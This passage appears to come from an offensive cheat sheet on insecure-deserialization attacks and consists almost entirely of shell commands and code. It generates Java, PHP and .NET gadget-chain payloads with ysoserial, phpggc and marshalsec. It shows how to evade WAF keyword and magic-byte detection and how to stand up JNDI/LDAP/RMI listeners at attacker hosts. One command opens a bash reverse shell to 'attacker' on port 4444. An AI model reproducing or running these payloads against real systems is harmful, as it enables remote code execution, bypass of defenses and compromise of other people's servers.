print(base64.b64encode(bytes(data)).decode())
"

# PHP chain wrapping in nested serialization
phpggc -b Laravel/RCE1 'system("id")' | \
  python3 -c "
import sys
payload = sys.stdin.read().strip()
# Wrap in outer serialization to bypass naive unserialize detection
wrapped = f's:{{len(payload)}}:\"{payload}\";'
print(wrapped)
"
```

### WAF Rule Evasion

```bash
# Evade keyword-based detection for "CommonsCollections"
# Use alternative chains that avoid known class names
java -jar ysoserial.jar Spring1 'id' | base64 -w0       # Avoids CC classes
java -jar ysoserial.jar Hibernate1 'id' | base64 -w0     # Avoids CC classes
java -jar ysoserial.jar Groovy1 'id' | base64 -w0        # Uses Groovy runtime
java -jar ysoserial.jar Clojure 'id' | base64 -w0        # Uses Clojure runtime

# Evade magic byte detection (0xACED0005)
# Prepend random bytes before the actual serialization header
java -jar ysoserial.jar CommonsCollections5 'id' | \
  python3 -c "
import sys, base64, os
payload = sys.stdin.buffer.read()
prefix = os.urandom(16)  # Random prefix bytes
print(base64.b64encode(prefix + payload).decode())
"

# Use alternative serialization formats
# Java JSON via Jackson instead of binary serialization
cat > alt_payload.json << 'EOF'
{
  "@class": "java.util.PriorityQueue",
  "comparator": {"@class": "org.mozilla.javascript.NativeCallable"},
  "elements": ["touch /tmp/rce"]
}
EOF
base64 -w0 alt_payload.json

# PHP phar metadata instead of direct unserialize
phpggc -p phar Laravel/RCE1 'system("id")' -o /tmp/evil.phar
# Trigger via: file_get_contents("phar://upload/evil.jpg")
xxd /tmp/evil.phar | head -20
```

### Protocol-Level Bypass

```bash
# Use RMI registry instead of direct deserialization
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0
# Listener serves actual exploit chain only when client connects

# JNDI injection via LDAP (bypasses some filters)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8000 1389
# Client payload just references LDAP URL, not full chain
java -jar ysoserial.jar Jdk7u21 'ldap://attacker:1389/obj' | base64 -w0

# CORBA/IIOP exploitation path (alternative to JRMP)
java -cp marshalsec.jar marshalsec.jndi.CORBARefServer http://attacker:8000 1050

# Multi-hop JNDI chain
# Step 1: JRMP -> attacker:1099
# Step 2: attacker:1099 serves LDAP redirect -> attacker:1389
# Step 3: attacker:1389 serves remote class loading
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0
# On attacker:
java -cp marshalsec.jar marshalsec.jndi.JRMPListener 1099 LDAPRefServer http://attacker2:8000 1389
```

### Custom Payload Generation

```bash
# Generate ysoserial payload with custom bytecode
# Create a Java class that executes on static init
cat > CustomPayload.java << 'JAVAEOF'
import java.io.*;
public class CustomPayload implements Serializable {
    static {
        try { Runtime.getRuntime().exec("id"); }
        catch (Exception e) {}
    }
}
JAVAEOF
javac CustomPayload.java

# Use TemplatesImpl gadget to load custom bytecode
java -jar ysoserial.jar CommonsCollections5 \
  "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" | \
  python3 -c "
import sys, base64
data = sys.stdin.buffer.read()
# Add custom annotation to stream
print(base64.b64encode(data).decode())
"

# Generate .NET payload with custom assembly loading
ysoserial.net -g ActivitySurrogateSelectorFromFile -f BinaryFormatter \
  -c "cmd /c calc" \
  --input-file custom_shellcode.dll \
  --base64
```
